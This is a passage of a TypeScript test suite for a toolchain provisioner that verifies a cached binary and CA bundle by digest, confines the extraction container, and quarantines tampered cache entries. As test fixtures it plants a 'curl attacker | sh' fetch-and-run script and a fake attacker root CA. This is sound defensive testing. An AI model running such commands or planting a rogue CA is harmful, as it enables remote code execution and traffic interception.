    for (const ca of ["", "not a certificate at all", `${CA_PEM_HEADER}\nshort\n`]) {
      const h = harness({ ca });
      const cacheRoot = tempDir("ompd-cache-");

      await expect(provision(h, cacheRoot)).rejects.toThrow(/extracting a CA bundle from/);
      expect(h.fetched).toEqual([]);
      expect(readdirSync(cacheRoot)).toEqual([]);
    }
  });

  test("a non-zero extraction is refused even if stdout looks like a bundle", async () => {
    const h = harness({ caCode: 125 });
    await expect(provision(h, tempDir("ompd-cache-"))).rejects.toThrow(/exit 125/);
  });

  test("a runtime that cannot be probed for a capability is a refusal, not an unconfined run", async () => {
    // The extraction confines itself with the flags the binary declares, so it
    // needs a capability. Every caller in the tree hands one in; the probe is
    // the safety net for a caller that forgets.
    //
    // The failure mode being guarded is that the obvious default for "I could
    // not work out which flags this CLI accepts" is to send none of them, which
    // is an extraction that quietly loses its confinement and its network
    // isolation with nothing reporting that it did. So an unprobeable runtime
    // refuses, and it refuses before the download.
    // `capability: null` is what opts this test out of the handed-in capability
    // every other default-path test uses, so the probe is actually reached.
    const h = harness({ helpCode: 1 });
    const cacheRoot = tempDir("ompd-cache-");

    let message = "";
    try {
      await provision(h, cacheRoot, { capability: null });
    } catch (err) {
      message = err instanceof Error ? err.message : String(err);
    }

    expect(message).toContain("no capability was handed to ensureToolchain");
    expect(message).toContain("refusing rather than running it unconfined");
    // The probe's own hint is carried through, so the operator is told what to
    // run rather than merely that something was unknowable.
    expect(message).toContain("unverifiable");
    expect(message).toContain("container run --help");
    // Nothing downloaded, nothing landed, and no network left behind.
    expect(h.fetched).toEqual([]);
    expect(readdirSync(cacheRoot)).toEqual([]);
    expect(h.argv.some(cmd => cmd[1] === "network" && cmd[2] === "create")).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// The acceptance rule is the manifest, not the shape
// ---------------------------------------------------------------------------

describe("what counts as the reviewed trust store", () => {
  test("a truncated bundle is refused even though it is a valid PEM well over the old floor", async () => {
    // The exact substitution the check this replaced would have accepted. It
    // used to be a PEM header plus a 1000-byte floor, and this is one genuine
    // certificate cut out of the reviewed bundle: header present, valid PEM,
    // comfortably past the floor, and nothing whatsoever like the trust store
    // omp is supposed to use. Under the old rule it would have been written
    // into the cache and mounted as SSL_CERT_FILE for every model call.
    const oneCert = CA_PEM.slice(0, CA_PEM.indexOf(CA_PEM_HEADER, 1));
    expect(oneCert.startsWith(CA_PEM_HEADER)).toBe(true);
    expect(oneCert.length).toBeGreaterThan(1000);
    expect(oneCert.split(CA_PEM_HEADER).length - 1).toBe(1);

    const h = harness({ ca: oneCert });
    const cacheRoot = tempDir("ompd-cache-");

    let message = "";
    try {
      await provision(h, cacheRoot);
    } catch (err) {
      message = err instanceof Error ? err.message : String(err);
    }

    // Refused as "not the reviewed one", not as "not a bundle": it is a bundle.
    expect(message).toContain("is not the reviewed one");
    expect(message).toContain(`${oneCert.length} bytes, 1 certificates`);
    expect(message).toContain(`${CA_BUNDLE_BYTES} bytes, ${CA_BUNDLE_CERT_COUNT} certificates`);
    expect(h.fetched).toEqual([]);
    expect(readdirSync(cacheRoot)).toEqual([]);
  });

  test("a substituted bundle of exactly the reviewed length is refused on the digest alone", async () => {
    // The case a byte count cannot see. Same length as the reviewed bundle to
    // the byte, so the only thing left to catch it is the digest, which is the
    // reason the digest is the acceptance criterion rather than a second
    // opinion on the length.
    const substituted = `${CA_PEM.slice(0, CA_PEM.length - 30)}${"A".repeat(29)}\n`;
    expect(substituted.length).toBe(CA_BUNDLE_BYTES);
    expect(createHash("sha256").update(new TextEncoder().encode(substituted)).digest("hex")).not.toBe(CA_BUNDLE_SHA256);

    const h = harness({ ca: substituted });
    const cacheRoot = tempDir("ompd-cache-");

    let message = "";
    try {
      await provision(h, cacheRoot);
    } catch (err) {
      message = err instanceof Error ? err.message : String(err);
    }

    expect(message).toContain("is not the reviewed one");
    expect(message).toContain(CA_BUNDLE_SHA256);
    // Not the OrbStack shape, so the message must not claim it recognises this.
    expect(message).not.toContain("That digest is recognised");
    expect(h.fetched).toEqual([]);
    expect(readdirSync(cacheRoot)).toEqual([]);
  });

  test("the OrbStack shape is refused on docker too, and the message names docker", async () => {
    // The sibling case to the one in the block above, which runs the same bytes
    // through Apple's runtime. OrbStack *is* docker, so this is the pairing
    // that actually happens on an operator's machine, and the message has to
    // name the runtime that did it rather than a generic "the runtime".
    const h = harness({ ca: CA_PEM + ORBSTACK_CA });
    const cacheRoot = tempDir("ompd-cache-");

    let message = "";
    try {
      await provision(h, cacheRoot, { capability: DOCKER_CAP });
    } catch (err) {
      message = err instanceof Error ? err.message : String(err);
    }

    expect(message).toContain("the CA bundle docker extracted from");
    expect(message).not.toContain("the CA bundle container extracted from");
    // Both digests, and the recognition that turns two lines of hex into a
    // diagnosis.
    expect(message).toContain(CA_BUNDLE_ORBSTACK_SHA256);
    expect(message).toContain(CA_BUNDLE_SHA256);
    expect(message).toContain("That digest is recognised");
    expect(message).toContain("OrbStack Development Root CA");
    expect(readdirSync(cacheRoot)).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// The extraction container is confined and alone
// ---------------------------------------------------------------------------

describe("the extraction container", () => {
  test("runs alone on a network created for it, and never on the shared default", async () => {
    // The defect this closes: with no `--network` argument the runtime puts the
    // container on its shared default network, which is the segment every
    // other container on the machine is on. `cat` needs no network at all, so
    // that reach bought nothing and exposed the operator's database, cache and
    // anything else they happen to be running.
    const h = harness();
    await provision(h, tempDir("ompd-cache-"));

    const { created, removed } = networkOps(h.argv);
    expect(created).toHaveLength(1);
    expect(created[0]).toMatch(/^ompd-ca-[0-9a-f]{12}$/);
    // Created before the run and removed after it, in that order.
    const order = h.argv.map(cmd => cmd.slice(1, 3).join(" "));
    expect(order.indexOf("network create")).toBeLessThan(order.findIndex((_, i) => h.argv[i]?.includes("cat")));
    expect(order.indexOf("network rm")).toBeGreaterThan(order.findIndex((_, i) => h.argv[i]?.includes("cat")));
    expect(removed).toEqual(created);

    // And the run actually joined it, rather than merely having one made.
    const run = h.argv.find(cmd => cmd.includes("cat")) ?? [];
    expect(run[run.indexOf("--network") + 1]).toBe(created[0]);
  });

  test("prefers no network at all where the runtime has one, and then creates nothing", async () => {
    // `--network none` exists on docker and podman and does not exist on Apple
    // `container`, whose own error for it is `notFound: network none not
    // found`. Where it is available it is strictly better than a private
    // network, and `cat` makes it sufficient as well as strictest.
    const h = harness({ ca: CA_PEM });
    await provision(h, tempDir("ompd-cache-"), { capability: DOCKER_CAP });

    const run = h.argv.find(cmd => cmd.includes("cat")) ?? [];
    expect(run[run.indexOf("--network") + 1]).toBe("none");
    // Nothing created means nothing to reclaim, and `network rm none` would be
    // an attempt to delete a runtime-owned name.
    expect(networkOps(h.argv)).toEqual({ created: [], removed: [] });
  });

  test("applies every confinement flag the runtime declares, and no more", async () => {
    // Docker declares the lot, so this is the full set. Asserted as an exact
    // argv rather than a set of `toContain`s, because a flag that quietly
    // stopped being sent is the whole failure mode here and a containment
    // assertion cannot see it.
    const h = harness();
    await provision(h, tempDir("ompd-cache-"), { capability: DOCKER_CAP });

    const uid = process.getuid?.();
    const gid = process.getgid?.();
    expect(h.argv.find(cmd => cmd.includes("cat"))).toEqual([
      "docker",
      "run",
      "--rm",
      "--network",
      "none",
      "--cap-drop",
      "ALL",
      "--security-opt",
      "no-new-privileges:true",
      "--read-only",
      "--pids-limit",
      "32",
      "--memory",
      "256m",
      "--cpus",
      "1",
      "--user",
      `${uid}:${gid}`,
      CA_SOURCE_IMAGE,
      "cat",
      "/etc/ssl/certs/ca-certificates.crt",
    ]);
  });

  test("sends no numeric identity flag to a runtime that crashes on one", async () => {
    // Apple `container` 0.4.1 dies with `XPC connection error: Connection
    // interrupted` on `--user 501:20`, `--uid 501` and `--uid 1000 --gid 1000`
    // alike, which is why `RUNTIME_FACTS.container` records `numericUser:
    // false` and overrides the help-text parse. Sending one would not be
    // tighter confinement, it would be a broken extraction.
    const h = harness();
    await provision(h, tempDir("ompd-cache-"));

    expect(APPLE_CAP.numericUser).toBe(false);
    const run = h.argv.find(cmd => cmd.includes("cat")) ?? [];
    expect(run).not.toContain("--user");
    expect(run).not.toContain("--uid");
    // Nor the three Apple's CLI rejects outright with exit 64.
    for (const flag of ["--cap-drop", "--security-opt", "--read-only", "--pids-limit"]) {
      expect(run).not.toContain(flag);
    }
    // What it does accept, it gets.
    expect(run).toContain("--memory");
    expect(run).toContain("--cpus");
  });

  test("passes nothing from the daemon's environment", async () => {
    // `cat` takes no configuration and nothing in the daemon's environment is
    // this container's business. Both spellings, because `-e` and `--env` are
    // the same flag and only checking one is how the other gets added later.
    const h = harness();
    await provision(h, tempDir("ompd-cache-"));

    for (const cmd of h.argv) {
      expect(cmd).not.toContain("-e");
      expect(cmd).not.toContain("--env");
    }
  });

  test("removes its network on the failure path too, and leaves no cache directory", async () => {
    // A refusal that leaked a network would leave the operator to find it with
    // `network ls` and guess what made it. The teardown is in a `finally` for
    // exactly this case.
    const h = harness({ ca: "not a certificate at all" });
    const cacheRoot = tempDir("ompd-cache-");

    await expect(provision(h, cacheRoot)).rejects.toThrow(ProvisionError);

    const { created, removed } = networkOps(h.argv);
    expect(created).toHaveLength(1);
    expect(removed).toEqual(created);
    // Nothing landed, no staging directory, no quarantine.
    expect(readdirSync(cacheRoot)).toEqual([]);
  });

  test("refuses rather than falling back to the shared default when its network cannot be made", async () => {
    // The tempting fallback is the exact thing this is here to avoid, and it
    // would be taken at the moment something is already wrong with the
    // runtime's networking.
    const argv: string[][] = [];
    const run: CommandRunner = async (command: string[]): Promise<CommandResult> => {
      argv.push([...command]);
      if (command[1] === "network" && command[2] === "create") {
        return { code: 1, stdout: "", stderr: "no address space left" };
      }
      if (command.includes("cat")) return { code: 0, stdout: CA_PEM, stderr: "" };
      return { code: 0, stdout: "", stderr: "" };
    };
    const cacheRoot = tempDir("ompd-cache-");

    let message = "";
    try {
      await ensureToolchain({
        runtime: "container",
        capability: APPLE_CAP,
        spec: SPEC,
        run,
        cacheRoot,
        ompVersion: TEST_RELEASE.version,
        arch: TEST_RELEASE.arch,
        releases: TEST_RELEASES,
        fetchAsset: async () => OMP_BYTES,
      });
    } catch (err) {
      message = err instanceof Error ? err.message : String(err);
    }

    expect(message).toContain("no address space left");
    expect(message).toContain("Refusing rather than falling back to the shared default network");
    // The extraction never ran, so there was never an unconfined container.
    expect(argv.some(cmd => cmd.includes("cat"))).toBe(false);
    expect(readdirSync(cacheRoot)).toEqual([]);
  });

  test("a capability describing another runtime is refused, not applied", async () => {
    // Docker's flag set sent to Apple's CLI is how `--user 501:20` reaches a
    // runtime that crashes on it. A caller that pairs the wrong two is stopped.
    const h = harness();

    await expect(
      ensureToolchain({
        runtime: "container",
        capability: DOCKER_CAP,
        spec: SPEC,
        run: h.run,
        cacheRoot: tempDir("ompd-cache-"),
        ompVersion: TEST_RELEASE.version,
        arch: TEST_RELEASE.arch,
        releases: TEST_RELEASES,
        fetchAsset: h.fetchAsset,
      }),
    ).rejects.toThrow(/describes docker but the runtime to run is container/);
    expect(h.argv).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// Losing the atomic rename: adopting a directory this provision did not write
// ---------------------------------------------------------------------------

describe("a directory adopted after losing the rename", () => {
  /**
   * Plant a complete directory at the canonical cache path, so a provision
   * already in flight loses its atomic rename to it.
   *
   * This is the race, made deterministic. `land` stages into a sibling
   * directory and renames it onto the canonical name, and POSIX `rename` onto a
   * non-empty directory fails with ENOTEMPTY, which is exactly what happens
   * when a concurrent provision got there first. Planting from inside the
   * injected `fetchAsset` puts it in the one window that matters: after this
   * provision probed the cache and found nothing, and before it renames.
   */
  function plant(cacheRoot: string, contents: { omp: Uint8Array; shim: string; ca: string; shimAsDir?: true }): string {
    const dir = toolchainDir(cacheRoot, { ompVersion: TEST_RELEASE.version, arch: TEST_RELEASE.arch }, OMP_SHA);
    mkdirSync(dir, { recursive: true });
    writeFileSync(join(dir, "omp"), contents.omp);
    writeFileSync(join(dir, "ca-certificates.crt"), contents.ca);
    if (contents.shimAsDir === true) mkdirSync(join(dir, "omp-shim"));
    else writeFileSync(join(dir, "omp-shim"), contents.shim);
    chmodSync(dir, 0o700);
    return dir;
  }

  /** A provision that plants `contents` at the canonical path mid-flight. */
  function raced(
    h: Harness,
    cacheRoot: string,
    contents: { omp: Uint8Array; shim: string; ca: string; shimAsDir?: true },
  ) {
    let planted = "";
    return {
      get dir() {
        return planted;
      },
      run: ensureToolchain({
        runtime: "container",
        capability: APPLE_CAP,
        spec: SPEC,
        run: h.run,
        cacheRoot,
        ompVersion: TEST_RELEASE.version,
        arch: TEST_RELEASE.arch,
        releases: TEST_RELEASES,
        fetchAsset: async () => {
          planted = plant(cacheRoot, contents);
          return OMP_BYTES;
        },
      }),
    };
  }

  test("a poisoned winner is refused rather than adopted for having the right name", async () => {
    // The whole point of B2. The directory name carries the omp digest, so a
    // winner has the right *name* by construction: it is the same
    // content-addressed path this provision was about to create. That is a
    // claim about its contents and not evidence of them, and before this fix
    // the adopt path took the claim.
    const cacheRoot = tempDir("ompd-cache-");
    const race = raced(harness(), cacheRoot, {
      omp: new TextEncoder().encode("#!/bin/sh\ncurl attacker | sh\n"),
      shim: renderOmpHomeShim("/opt/ompd/omp"),
      ca: CA_PEM,
    });

    let message = "";
    try {
      await race.run;
    } catch (err) {
      message = err instanceof Error ? err.message : String(err);
    }

    // Refused, and refused as a race rather than as a generic bad entry.
    expect(message).toContain("does not match the reviewed manifest");
    expect(message).toContain("written by a concurrent provision rather than by this one");
    expect(message).toContain(`not the reviewed ${TEST_RELEASE.sha256}`);

    // The poisoned bytes were never mounted, and never deleted either: the
    // entry is parked under `.untrusted-` so an operator can look at it.
    const parked = readdirSync(cacheRoot).filter(entry => entry.startsWith(".untrusted-"));
    expect(parked).toHaveLength(1);
    expect(readFileSync(join(cacheRoot, parked[0] ?? "", "omp"), "utf8")).toContain("curl attacker");
    // And nothing was written into the suspect directory on the way past.
    expect(readdirSync(join(cacheRoot, parked[0] ?? "")).sort()).toEqual(["ca-certificates.crt", "omp", "omp-shim"]);
  });

  test("a winner with a tampered trust store is refused too, not only a tampered binary", async () => {
    // The trust store does not name the directory, so it is the file a
    // name-trusting adopt path would have missed entirely. This is the reviewer's
    // original finding, reached through the race rather than through a hit.
    const cacheRoot = tempDir("ompd-cache-");
    const race = raced(harness(), cacheRoot, {
      omp: OMP_BYTES,
      shim: renderOmpHomeShim("/opt/ompd/omp"),
      ca: CA_PEM + ORBSTACK_CA,
    });

    await expect(race.run).rejects.toThrow(/ca-certificates\.crt is sha256/);
    expect(readdirSync(cacheRoot).filter(entry => entry.startsWith(".untrusted-"))).toHaveLength(1);
  });

  test("a good winner is adopted, its own bytes are reported, and its stale shim is refreshed", async () => {
    // The other half of running the same validation: a winner that passes has
    // to be *used*, and used correctly. Two properties here that the adopt path
    // did not have. The digests reported are read from the adopted directory
    // rather than from the bytes this call happened to download, which is only
    // observable because the winner's shim differs. And the shim is brought up
    // to date, which the hit path did and the adopt path did not, so a winner
    // written by an older build of ompd used to pin its old shim forever. The
    // shim decides whether an OMP home seeded on the workspace mount is honoured
    // or refused, so that is a security behaviour going stale.
    const cacheRoot = tempDir("ompd-cache-");
    const race = raced(harness(), cacheRoot, {
      omp: OMP_BYTES,
      shim: '#!/bin/sh\n# written by an older ompd\nexec /opt/ompd/omp "$@"\n',
      ca: CA_PEM,
    });

    const resolved = await race.run;

    // Adopted, not populated by this call.
    expect(resolved.cached).toBe(true);
    expect(resolved.toolsDir).toBe(race.dir);
    // Digests from the adopted bytes.
    expect(resolved.ompSha256).toBe(OMP_SHA);
    expect(resolved.caSha256).toBe(CA_BUNDLE_SHA256);
    // The winner's stale shim was replaced with the current template.
    const shim = readFileSync(join(race.dir, "omp-shim"), "utf8");
    expect(shim).not.toContain("written by an older ompd");
    expect(shim).toBe(renderOmpHomeShim(`${TOOLCHAIN_MOUNT_PATH}/omp`));
    expect(shim).toContain("refusing to fall back to the image's HOME");
    // Nothing quarantined: the winner was fine.
    expect(readdirSync(cacheRoot).filter(entry => entry.startsWith(".untrusted-"))).toEqual([]);
  });

  test("the hit path and the adopt path refuse the same poison with the same reason", async () => {
    // The factoring, asserted rather than asserted-in-a-comment. Both paths run
    // `probeCache` and then the shim refresh through one function, so the same
    // bad directory has to produce the same reason whichever way it is reached.
    // Two copies of the checks is how they drifted apart in the first place.
    const poison = {
      omp: new TextEncoder().encode("not the release"),
      shim: renderOmpHomeShim("/opt/ompd/omp"),
      ca: CA_PEM,
    };

    // Reached by losing the race.
    const raceRoot = tempDir("ompd-cache-");
    let viaRace = "";
    try {
      await raced(harness(), raceRoot, poison).run;
    } catch (err) {
      viaRace = err instanceof Error ? err.message : String(err);
    }

    // Reached by finding it already there, with no race at all.
    const hitRoot = tempDir("ompd-cache-");
    plant(hitRoot, poison);
    const logs: string[] = [];
    await provision(harness(), hitRoot, { onLog: line => logs.push(line) });

    const badDigest = createHash("sha256").update(poison.omp).digest("hex");
    const reason = `its omp is sha256 ${badDigest}, not the reviewed ${TEST_RELEASE.sha256}`;
    // The identical reason string, from the identical check.
    expect(viaRace).toContain(reason);
    expect(logs.join("\n")).toContain(reason);
  });

  test("a filesystem error while refreshing the winner's shim is a ProvisionError, not a raw fs throw", async () => {
    // `refreshShim` writes a staged file into the directory and renames it over
    // the old one, so anything that changed the tree between the probe and the
    // write surfaces here. A bare ENOENT or EISDIR escaping would reach the
    // caller as an unclassified `Error` out of a module whose every other
    // refusal is a `ProvisionError` carrying a reason and a path.
    //
    // Provoked with `omp-shim` as a directory, which is the reachable member of
    // that class: `probeCache` only stats it, so the entry verifies, and then
    // the rename onto it fails. The literal ENOENT needs the directory to be
    // removed inside a window no test can open without a seam that should not
    // exist, and it is the same catch.
    const cacheRoot = tempDir("ompd-cache-");
    const race = raced(harness(), cacheRoot, {
      omp: OMP_BYTES,
      shim: "",
      ca: CA_PEM,
      shimAsDir: true,
    });

    let error: unknown;
    try {
      await race.run;
    } catch (err) {
      error = err;
    }

    expect(error).toBeInstanceOf(ProvisionError);
    const message = error instanceof Error ? error.message : "";
    expect(message).toContain("could not have its shim brought up to date");
    expect(message).toContain(race.dir);
    expect(message).toContain("changed underneath the check");
  });
});

// ---------------------------------------------------------------------------
// Cache hits
// ---------------------------------------------------------------------------

describe("a cached toolchain", () => {
  test("is reused without a download or a CA extraction", async () => {
    const cacheRoot = tempDir("ompd-cache-");
    const populated = await provision(harness(), cacheRoot);

    const second = harness();
    const hit = await provision(second, cacheRoot);

    expect(hit.cached).toBe(true);
    expect(hit.toolsDir).toBe(populated.toolsDir);
    expect(hit.ompSha256).toBe(OMP_SHA);
    expect(hit.caSha256).toBe(CA_BUNDLE_SHA256);
    expect(second.fetched).toEqual([]);
    expect(second.argv).toEqual([]);
  });

  test("a tampered ca-certificates.crt alone forces a rebuild, and the tampered bytes are never resolved", async () => {
    // The reviewer's exact reproduction, and the reason this describe block was
    // rewritten. Before the fix, a hit verified `omp` (whose digest names the
    // directory) and byte-compared the shim, and never looked at the trust
    // store at all. Their output was:
    //
    //   cached (hit)? true / CA re-extracted? NO
    //   VERDICT: the trust store mounted at /opt/ompd/ca-certificates.crt is THE TAMPERED ONE
    //
    // Only the CA file is touched here. `omp` and the shim are left exactly as
    // they landed, so nothing but a CA check can catch it.
    const cacheRoot = tempDir("ompd-cache-");
    const populated = await provision(harness(), cacheRoot);
    const dir = populated.toolsDir ?? "";

    const tampered = `${CA_PEM_HEADER}\nATTACKER ROOT CA, TRUSTED FOR EVERY MODEL CALL\n-----END CERTIFICATE-----\n`;
    tamper(join(dir, "ca-certificates.crt"), tampered);
    const tamperedSha = createHash("sha256").update(new TextEncoder().encode(tampered)).digest("hex");

    const second = harness();
    const logs: string[] = [];
    const after = await provision(second, cacheRoot, { onLog: line => logs.push(line) });

    // Not a hit. It went and rebuilt, which is the observable difference.
    expect(after.cached).toBe(false);
    expect(second.fetched).toEqual([TEST_RELEASE.url]);
    expect(second.argv.some(cmd => cmd.includes("cat"))).toBe(true);

    // And the bytes it reports are the reviewed ones, never the tampered ones.
    expect(after.caSha256).toBe(CA_BUNDLE_SHA256);
    expect(after.caSha256).not.toBe(tamperedSha);
    expect(readFileSync(join(after.toolsDir ?? "", "ca-certificates.crt"), "utf8")).toBe(CA_PEM);

    // The rejected entry was moved aside rather than written into, so the
    // rebuild never followed anything an attacker arranged. Its bytes are
    // preserved as evidence.
    const parked = readdirSync(cacheRoot).filter(entry => entry.startsWith(".untrusted-"));
    expect(parked.length).toBe(1);
    expect(readFileSync(join(cacheRoot, parked[0] ?? "", "ca-certificates.crt"), "utf8")).toBe(tampered);
    expect(logs.some(line => line.includes("rejected") && line.includes("ca-certificates.crt"))).toBe(true);
  });

  test("tampered omp bytes force a rebuild, and the tampered bytes are never resolved", async () => {
    const cacheRoot = tempDir("ompd-cache-");
    const populated = await provision(harness(), cacheRoot);
    const dir = populated.toolsDir ?? "";

    // Truncated, the way a killed process would have left it.
    tamper(join(dir, "omp"), "");

    const second = harness();
    const after = await provision(second, cacheRoot);

    expect(after.cached).toBe(false);
    expect(second.fetched).toEqual([TEST_RELEASE.url]);
    expect(after.ompSha256).toBe(OMP_SHA);
    expect(readFileSync(join(after.toolsDir ?? "", "omp"))).toEqual(Buffer.from(OMP_BYTES));
    expect(readdirSync(cacheRoot).filter(entry => entry.startsWith(".untrusted-")).length).toBe(1);
  });

  test("a rejected entry is moved aside, and the rebuild is a different inode", async () => {
    // The one property that separates this from the dangerous version of the
    // same fix. Re-extracting into the suspect directory would mean writing
    // into a tree someone else may control, following their symlinks and racing
    // their writes. So the rejected directory is renamed aside in one syscall
    // that never descends into it, and the directory that ends up mounted is a
    // brand new inode. The canonical path is reused, so only the inode can tell
    // the two apart.
    const cacheRoot = tempDir("ompd-cache-");
    const populated = await provision(harness(), cacheRoot);
    const dir = populated.toolsDir ?? "";
    const rejectedInode = statSync(dir).ino;

    tamper(join(dir, "ca-certificates.crt"), `${CA_PEM_HEADER}\nrejected\n`);

    const after = await provision(harness(), cacheRoot);
    const rebuiltDir = after.toolsDir ?? "";

    expect(rebuiltDir).toBe(dir);
    expect(statSync(rebuiltDir).ino).not.toBe(rejectedInode);

    // The rejected inode is still there under its parked name, holding exactly
    // the bytes it held, which is both the evidence and the proof that nothing
    // was written into it.
    const parked = readdirSync(cacheRoot).filter(entry => entry.startsWith(".untrusted-"));
    expect(parked.length).toBe(1);
    const parkedDir = join(cacheRoot, parked[0] ?? "");
    expect(statSync(parkedDir).ino).toBe(rejectedInode);
    expect(readFileSync(join(parkedDir, "ca-certificates.crt"), "utf8")).toBe(`${CA_PEM_HEADER}\nrejected\n`);
    expect(readdirSync(parkedDir).sort()).toEqual(["ca-certificates.crt", "omp", "omp-shim"]);
  });

  test("a wrong-mode cache directory is rejected, however good its contents", async () => {
    // Contents left completely intact: the only thing wrong is that another
    // account could write into the directory, which turns every digest check
    // above into verify-then-swap. Also the upgrade path, since entries written
    // by the older build are 0755.
    const cacheRoot = tempDir("ompd-cache-");
    const populated = await provision(harness(), cacheRoot);
    const dir = populated.toolsDir ?? "";
    chmodSync(dir, 0o755);

    const second = harness();
    const logs: string[] = [];
    const after = await provision(second, cacheRoot, { onLog: line => logs.push(line) });

    expect(after.cached).toBe(false);
    expect(second.fetched).toEqual([TEST_RELEASE.url]);
    expect(statSync(after.toolsDir ?? "").mode & 0o777).toBe(0o700);
    expect(logs.some(line => line.includes("its mode is 0755"))).toBe(true);
    expect(readdirSync(cacheRoot).filter(entry => entry.startsWith(".untrusted-")).length).toBe(1);
  });

  test("a group-writable cache directory is rejected as well", async () => {
    const cacheRoot = tempDir("ompd-cache-");
    const populated = await provision(harness(), cacheRoot);
    chmodSync(populated.toolsDir ?? "", 0o770);

    const second = harness();
    const after = await provision(second, cacheRoot);
    expect(after.cached).toBe(false);
    expect(statSync(after.toolsDir ?? "").mode & 0o777).toBe(0o700);
  });

  test("a quarantined entry is never read from again", async () => {
    // Two tampered provisions in a row: each one parks its own entry and builds
    // a fresh inode, and the mounted directory is never one that was rejected.
    const cacheRoot = tempDir("ompd-cache-");
    const first = await provision(harness(), cacheRoot);
    tamper(join(first.toolsDir ?? "", "ca-certificates.crt"), `${CA_PEM_HEADER}\nbad\n`);
    const second = await provision(harness(), cacheRoot);
    tamper(join(second.toolsDir ?? "", "ca-certificates.crt"), `${CA_PEM_HEADER}\nbad again\n`);
    const third = await provision(harness(), cacheRoot);

    expect(third.caSha256).toBe(CA_BUNDLE_SHA256);
    expect(readdirSync(cacheRoot).filter(entry => entry.startsWith(".untrusted-")).length).toBe(2);
    // The canonical name is reused, but never the inode: the parked copies still
    // hold their own bytes.
    expect(third.toolsDir).toBe(first.toolsDir);
    expect(readFileSync(join(third.toolsDir ?? "", "ca-certificates.crt"), "utf8")).toBe(CA_PEM);
  });

  test("a superseded shim is refreshed in place, still without a download", async () => {
    // The staleness this guards is real even though the shim is embedded: the
    // cache directory is named after the omp binary's digest, so a release of
    // ompd that changes the shim reuses the same directory. The shim decides
    // whether a workspace-seeded OMP home is honoured or refused, so an old copy
    // pinned there forever is a security behaviour going stale rather than a
    // cosmetic one.
    //
    // Deliberately not treated as tampering: replacing it is what an upgrade
    // needs, and quarantining would throw away a valid binary to rewrite two
    // kilobytes beside it.
    const cacheRoot = tempDir("ompd-cache-");
    const populated = await provision(harness(), cacheRoot);
    const dir = populated.toolsDir ?? "";
    const current = readFileSync(join(dir, "omp-shim"), "utf8");

    chmodSync(join(dir, "omp-shim"), 0o755);
    writeFileSync(join(dir, "omp-shim"), '#!/bin/sh\n# an older build\nexec /opt/ompd/omp "$@"\n');

    const second = harness();
    const hit = await provision(second, cacheRoot);

    expect(hit.cached).toBe(true);
    expect(second.fetched).toEqual([]);
    const shim = readFileSync(join(dir, "omp-shim"), "utf8");
    expect(shim).toBe(current);
    expect(shim).not.toContain("an older build");
    expect(shim).toContain("refusing to fall back to the image's HOME");
    expect(readdirSync(dir).sort()).toEqual(["ca-certificates.crt", "omp", "omp-shim"]);
    // Refreshed, not quarantined.
    expect(readdirSync(cacheRoot).filter(entry => entry.startsWith(".untrusted-"))).toEqual([]);
  });

  test("another version does not collide with the cached one", async () => {
    const cacheRoot = tempDir("ompd-cache-");
    await provision(harness(), cacheRoot);

    const second = harness();
    const other = await provision(second, cacheRoot, { version: TEST_RELEASE_NEXT.version });

    expect(other.cached).toBe(false);
    expect(second.fetched).toEqual([TEST_RELEASE_NEXT.url]);
    expect(readdirSync(cacheRoot).sort()).toEqual([
      `omp-${TEST_RELEASE.version}-arm64-${OMP_SHA.slice(0, 12)}`,
      `omp-${TEST_RELEASE_NEXT.version}-arm64-${OMP_SHA.slice(0, 12)}`,
    ]);
  });

  test("a directory whose name claims a digest the manifest does not is never consulted", async () => {
    // The hit path stats one path, computed from the manifest digest, so a
    // complete-looking entry under any other digest cannot be mounted at all.
    // Stronger than the prefix scan it replaced, which had to reject such a
    // directory correctly every time rather than never looking at it.
    const cacheRoot = tempDir("ompd-cache-");
    const decoy = join(cacheRoot, `omp-${TEST_RELEASE.version}-arm64-deadbeefcafe`);
    mkdirSync(decoy, { recursive: true, mode: 0o700 });
    writeFileSync(join(decoy, "omp"), "not the release");
    writeFileSync(join(decoy, "omp-shim"), '#!/bin/sh\nexec /opt/ompd/omp "$@"\n');
    writeFileSync(join(decoy, "ca-certificates.crt"), CA_PEM);

    const h = harness();
    const resolved = await provision(h, cacheRoot);

    expect(resolved.cached).toBe(false);
    expect(resolved.toolsDir).toBe(join(cacheRoot, `omp-${TEST_RELEASE.version}-arm64-${OMP_SHA.slice(0, 12)}`));
    expect(h.fetched).toEqual([TEST_RELEASE.url]);
    // Left alone entirely: not mounted, and not quarantined either, because
    // nothing ever looked at it.
    expect(readFileSync(join(decoy, "omp"), "utf8")).toBe("not the release");
  });
});

// ---------------------------------------------------------------------------
// Failures leave nothing behind
// ---------------------------------------------------------------------------

describe("a failed toolchain", () => {
  test("the shim is embedded, so no scripts directory is consulted at all", async () => {
    // The reason this replaced a pair of "the file is missing / the file drifted"
    // tests: reading the shim off disk relative to this module is correct from a
    // checkout and wrong in the single-file binary ompd ships, where
    // `import.meta.url` is `file:///$bunfs/root/<name>`. A defect that only
    // appears once installed is the worst shape available, so the shim is now a
    // template with no filesystem input and there is nothing left to miss.
    const h = harness();
    const resolved = await provision(h, tempDir("ompd-cache-"));

    const shim = readFileSync(join(resolved.toolsDir ?? "", "omp-shim"), "utf8");
    expect(shim).toContain('exec /opt/ompd/omp "$@"');
    // The security behaviour, not merely the exec target: a seeded home with no
    // `.omp` in it must be refused rather than quietly downgraded to the
    // image's own HOME, because that is the difference between "no credentials"
    // and "the wrong credentials".
    expect(shim).toContain("refusing to fall back to the image's HOME");
    expect(shim).toContain("exit 78");
  });

  test("the same template serves the image path with a different exec target", async () => {
    // `scripts/check-container-host.ts` builds an image that puts omp at a real
    // path instead of mounting it, and both callers rendering from one function
    // is what stops the two shims drifting apart.
    expect(renderOmpHomeShim("/usr/local/lib/omp/omp")).toContain('exec /usr/local/lib/omp/omp "$@"');
    expect(renderOmpHomeShim("/opt/ompd/omp")).toContain('exec /opt/ompd/omp "$@"');
    expect(renderOmpHomeShim("/usr/local/lib/omp/omp")).not.toContain("/opt/ompd/omp");
  });

  test("omp not on PATH is a named failure, not a 404 URL", async () => {
    const h = harness({ version: "", versionCode: 127 });

    await expect(
      ensureToolchain({
        runtime: "container",
        spec: SPEC,
        run: h.run,
        cacheRoot: tempDir("ompd-cache-"),
        arch: "arm64",
        releases: TEST_RELEASES,
        fetchAsset: h.fetchAsset,
      }),
    ).rejects.toThrow(/omp is not on PATH/);
    expect(h.fetched).toEqual([]);
  });

